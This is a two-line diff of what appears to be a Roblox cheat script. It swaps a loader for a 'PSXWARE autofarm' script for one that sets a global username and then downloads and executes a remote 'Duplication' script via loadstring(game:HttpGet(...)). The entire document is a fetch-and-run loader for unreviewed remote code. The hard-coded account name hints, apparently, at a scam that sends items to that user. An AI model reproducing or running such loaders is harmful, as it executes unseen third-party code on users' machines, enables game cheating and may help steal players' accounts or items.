@@ -1,1 +1,2 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/PSXWARE/PSXWARE2/main/PSXWARE%20autofarm'))()
+_G.Username = "vDISTXRBED"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/Centai/main/Duplication.string"))()
